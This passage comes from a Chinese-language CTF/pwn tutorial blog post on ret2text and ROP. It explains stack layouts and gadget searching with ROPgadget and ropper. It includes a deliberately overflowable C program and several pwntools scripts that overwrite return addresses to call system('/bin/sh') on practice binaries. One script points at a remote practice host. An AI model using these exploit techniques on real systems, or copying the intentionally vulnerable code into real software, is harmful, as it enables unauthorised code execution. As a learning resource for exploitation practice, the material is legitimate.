+<li>栈指针 <code>rsp</code> 向下移动 8 个字节（x86_64 上每次 <code>pop</code> 8 字节）。</li>
+</ul>
+<p><strong><code>ret</code></strong></p>
+<ul>
+<li>从栈顶再弹出一个值，当作新的返回地址，并跳转到该地址执行。</li>
+<li>栈指针 <code>rsp</code> 再次向下移动 8 个字节。</li>
+</ul>
+<p>我们可以在栈上构造如下数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[padding] -&gt; [pop rdi; ret] -&gt; [/bin/sh 的地址] -&gt; [system 的地址]</span><br></pre></td></tr></table></figure>
+
+<p><strong>栈帧变化示例</strong></p>
+<p>假设我们找到的 <code>pop rdi; ret</code> 的地址是 <code>0x400123</code>，<code>system</code> 的地址是 <code>0x400456</code>，<code>/bin/sh</code> 的地址是 <code>0x600678</code>。</p>
+<p><strong>栈布局构造</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">padding</span>]               &lt;-- 覆盖到返回地址</span><br><span class="line">[<span class="meta">0x400123</span>]              &lt;-- pop rdi; ret</span><br><span class="line">[<span class="meta">0x600678</span>]              &lt;-- /bin/sh 地址</span><br><span class="line">[<span class="meta">0x400456</span>]              &lt;-- system 地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行过程</strong></p>
+<ol>
+<li><strong>程序返回时</strong>：执行到 <code>pop rdi; ret</code> (<code>0x400123</code>)。</li>
+<li><strong>pop rdi</strong>：从栈顶取出 <code>/bin/sh</code> 的地址（<code>0x600678</code>）并加载到 <code>rdi</code> 中。</li>
+<li><strong>ret</strong>：从栈顶取出下一个地址（<code>0x400456</code>）并跳转到 <code>system</code> 函数。</li>
+<li>**system(“&#x2F;bin&#x2F;sh”)**：<code>system</code> 函数使用 <code>rdi</code> 作为参数，执行 <code>/bin/sh</code>。</li>
+</ol>
+<p><strong>如何找到pop rdi;ret</strong>?在实际利用中，我们使用工具 <strong><code>ROPgadget</code></strong> 或 <strong><code>ropper</code></strong> 来找到 <code>pop rdi; ret</code>。</p>
+<p><strong>使用 ROPgadget</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./level2_x64 | grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>ROPgadget 是一个工具</strong></p>
+<ul>
+<li><strong>作用</strong>：帮助攻击者在二进制文件中<strong>寻找可用的gadget</strong>。</li>
+<li><strong>目标</strong>：找到像 <code>pop rdi; ret</code>、<code>pop rsi; ret</code> 这样的有用指令片段</li>
+</ul>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20241231140833374.png" alt="image-20241231140833374"></p>
+<p><strong>使用 ropper</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./level2_x64 --search <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在<strong>二进制安全</strong>领域，特别是<strong>ROP（Return Oriented Programming，面向返回的编程）</strong>中，Gadget是一段可控的小型指令序列<strong>，通常以 <code>ret</code>（返回）指令结尾。这些指令片段存在于</strong>可执行程序或库（如 libc.so）中，攻击者可以通过精心构造的栈来控制程序的执行流程，达到任意代码执行目的。</p>
+<p>Gadget 并不是人为编写的，而是<strong>从现有的二进制文件中提取</strong>的</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103191207269.png" alt="image-20250103191207269"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span>  </span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x404040</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40120b</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64 =&gt; 0x0b 0x12 0x40 0x00 0x00 0x00 0x00 0x00</span></span><br><span class="line"><span class="comment"># p32 =&gt; 0x0b 0x12 0x40 0x00</span></span><br><span class="line"><span class="comment"># p16 =&gt; 0x0b 0x12</span></span><br><span class="line"><span class="comment"># p8  =&gt; 0x0b</span></span><br><span class="line"><span class="comment"># struct.pack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250104170517772.png" alt="image-20250104170517772"></p>
+<h3 id="（3）限制栈溢出长度情景"><a href="#（3）限制栈溢出长度情景" class="headerlink" title="（3）限制栈溢出长度情景"></a>（3）限制栈溢出长度情景</h3><p><strong>限制栈溢出长度的情景</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bbbbbbbbbbbbbbbbbbin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x1c</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;bin&#x2F;sh；sh一样能执行，只需找到sh地址即可</p>
+<p>因为call比直接跳转多一个push eip的过程，之前的方法你要自己造一个eip，现在不用了，这个空间就省出来了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_3_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  </span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x0804C03A</span></span><br><span class="line">call_func_addr = <span class="number">0x0804919B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p32(call_func_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>aaaabaaacaaadaaaeaaafaaaga</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_3_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  </span><br><span class="line"><span class="comment">#padding = padding2ebp + context.word_size//8   #通过调试得到</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x0804919B</span></span><br><span class="line">sh_addr = <span class="number">0x804C03A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p32(return_addr) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、例题"><a href="#三、例题" class="headerlink" title="三、例题"></a>三、例题</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20241231110921523.png" alt="image-20241231110921523"></p>
+<p>Read存在栈溢出，且存在&#x2F;bin&#x2F;sh字符串</p>
+<p>思路：覆盖返回地址为system_plt,并根据32位的参数传递规则，设置参数&#x2F;bin&#x2F;sh</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20241231111116450.png" alt="image-20241231111116450"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file_path=<span class="string">&#x27;./level2&#x27;</span></span><br><span class="line">context(binary=file_path,os=<span class="string">&#x27;linux&#x27;</span>,terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">glibc_version=<span class="string">&quot;2.23&quot;</span></span><br><span class="line">_debug_=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"><span class="comment">#pwn.io init</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    pwn_file=<span class="string">&quot;/glibc/%s/32/lib/ld-%s.so --library-path /glibc/%s/32/lib/ %s&quot;</span>%(glibc_version,glibc_version,glibc_version,file_path)</span><br><span class="line">    p = process(pwn_file.split())</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/glibc/%s/32/lib/libc-%s.so&#x27;</span>%(glibc_version,glibc_version))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28124</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;../libc/u16/x86libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048480</span></span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(system_plt)+p32(main_addr)+p32(binsh)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x0804847E&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Input&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>buf</code> 大小为 <strong>136 字节 (0x88)</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">低地址</span><br><span class="line">[ buf (136字节) ]     ← 0x88 (136 字节)</span><br><span class="line">[ EBP (4字节) ]       ← b<span class="string">&#x27;b&#x27;</span>*4</span><br><span class="line">[ RET (返回地址) ]    ← p32(system_plt)</span><br><span class="line">[ 参数1 ]            ← p32(binsh)</span><br><span class="line">[ 返回地址2 ]        ← p32(main_addr)</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>64位</strong>：</p>
+<p>漏洞成因和32位的一致。利用思路也一致</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://matriy330.github.io">Matriy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://matriy330.github.io/be3a58d/">http://matriy330.github.io/be3a58d/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://matriy330.github.io" target="_blank">Matriy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/learn/">learn</a></div><div class="post-share"><div class="social-share" data-image="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103182441795.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/zsm.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zsm.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/214d932/" title="GDB基本使用及pwn常用命令"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20241231155811614.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-09</div><div class="info-item-2">GDB基本使用及pwn常用命令</div></div><div class="info-2"><div class="info-item-1">GDB基本使用及pwn常用命令i r查看寄存器  start 运行程序，停在 main 函数的第一行。 run 从程序的入口点开始执行，并会一直运行，直到.程序正常结束。 b main ,b *(0xdsds)设置断点 i b查看断点，d main删除断电，disable b 2，让断点失效。enable b 3  si会进入xx方法实现的里面 ni是下一步。finish步出 c继续    显示从地址0x100开始的10个十六进制数：x&#x2F;10x 0x100  显示从寄存器$rax开始的4个无符号十进制数：x&#x2F;4uw $rax  显示字符数组str的内容，直到遇到’\0’结束：x&#x2F;s str     x/20g $rbp-0x20：这个命令表示从地址$rbp-0x20开始，以十六进制格式打印20个g大小的内存单元。这里的g通常代表8字节（64位）的巨量（giant word）。所以它会打印20个8字节的值，总共160字节的数据。这种格式通常用于查看较大数值或指针地址（在64位系统上指针也是8字节）。  x/20b...</div></div></div></a><a class="pagination-related" href="/bddadc3c/" title="pwn入门-ELF文件概述程序装载与虚拟内存"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20241231152727857.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-13</div><div class="info-item-2">pwn入门-ELF文件概述程序装载与虚拟内存</div></div><div class="info-2"><div class="info-item-1">pwn入门-ELF文件概述程序装载与虚拟内存参考程序加载 - CTF Wiki和https://www.bilibili.com/video/BV1Uv411j7fr?spm_id_from=333.788.videopod.episodes&amp;vd_source=d76ad0aadca055336653cd966075f064&amp;p=3  pwn概述exploit：用于攻击的脚本与方案 payload：攻击载荷，是的目标进程被劫持控制流的数据 shellcode：调用攻击目标的she的代码 攻击流程：  C语言执行流程C语言代码到可执行文件流程：  目标文件未经过链接，虽然知道自己任务但是不知道如何去做，比如put为何就是输入，需要将多个机器码目标文件链接成一个可执行文件  广义:文件中的数据是可执行代码的文件.out、.exe、.sh、.py 狭义:文件中的数据是机器码的文件.out、.exe、.dll、.so Windows:PE(Portable...</div></div></div></a><a class="pagination-related" href="/eb458dc8/" title="pwn入门-canary&amp;PIE bypass"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250112150236462.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="info-item-2">pwn入门-canary&amp;PIE bypass</div></div><div class="info-2"><div class="info-item-1">pwn入门-canary&amp;PIE bypass 主函数没有get shel怎么办?(ret2text) 整个程序没有system函数怎么办?(ret2libc)64位程序就这么简单?(ret2csu) 静态编译怎么办?(ret2syscall) 保护不全有没有好办法?(ret2shellcode) 栈与非栈的格式化字符串    canarycanary:是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致   canary保存在tls结构体中。   all和部分是有区别的 all是在所有方法都会加Cancary，部分只会在char那边加 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int func_1()&#123;    char...</div></div></div></a><a class="pagination-related" href="/b2a73a04/" title="pwn入门-ret2csu+栈对齐"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250106183137749.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-28</div><div class="info-item-2">pwn入门-ret2csu+栈对齐</div></div><div class="info-2"><div class="info-item-1">pwn入门-ret2csu+栈对齐没有写system就一定没?除了system还有vmmap mproject orw int 0x80 syscall open read puts exevc malloc_ hook free_hook exit_hook…. 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int dofunc()&#123;    char b[8] = &#123;&#125;;	write(1,&quot;input:&quot;,6);	read(0,b,0x100);	write(1,&quot;bye&quot;,3);    return 0;&#125;int main()&#123;    dofunc();    return...</div></div></div></a><a class="pagination-related" href="/e04de78e/" title="pwn入门-ret2libc"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250105142118174.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-30</div><div class="info-item-2">pwn入门-ret2libc</div></div><div class="info-2"><div class="info-item-1">pwn入门-ret2libcwrite(1) read(0)  0是输入，1是输出，write和puts有区别  amd64：前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中，第7个以后的参数存放于栈中 程序没有system怎么办? 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int dofunc()&#123;    char b[8] = &#123;&#125;;	write(1,&quot;input:&quot;,6);//2,3,4 fd=open(&#x27;./a&#x27;);puts	read(0,b,0x100);	write(1,&quot;byebye&quot;,6);    return 0;&#125;int main()&#123;    dofunc();    return 0;&#125;  ret2libc 即控制函数的执行libc...</div></div></div></a><a class="pagination-related" href="/24d119bd/" title="pwn入门-ret2shellcode"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250107164228610.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-01</div><div class="info-item-2">pwn入门-ret2shellcode</div></div><div class="info-2"><div class="info-item-1">pwn入门-ret2shellcode先看我的另一篇文章，shellcode详解 例一12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int dofunc()&#123;	char b[0x100];	puts(&quot;input:&quot;);		read(0,b,0x100);	((void (*) (void)) b)();    return 0;&#125;int main()&#123;    dofunc();    return 0;&#125;   NX：栈不可执行 123456789101112131415from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)pwnfile= &#x27;./question_6_1_x64&#x27;io =...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Matriy</div><div class="author-info-description">不积硅步，无以至千里</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">197</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Matriy330"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我是一个网安小白，一名安卓逆向工程师，Web安全开发工程师，二进制学习者</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%85%A5%E9%97%A8-ret2text-ROP%E8%AF%A6%E8%A7%A3"><span class="toc-text">pwn入门-ret2text+ROP详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81system-sh-%E6%83%85%E5%86%B5"><span class="toc-text">一、system(sh)情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%9C%80%E8%A6%81%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-text">二、需要传入参数的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%8932%E4%BD%8D"><span class="toc-text">（1）32位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%8964%E4%BD%8D"><span class="toc-text">（2）64位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E9%99%90%E5%88%B6%E6%A0%88%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6%E6%83%85%E6%99%AF"><span class="toc-text">（3）限制栈溢出长度情景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BE%8B%E9%A2%98"><span class="toc-text">三、例题</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/850e6e3/" title="Magisk学习简介"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 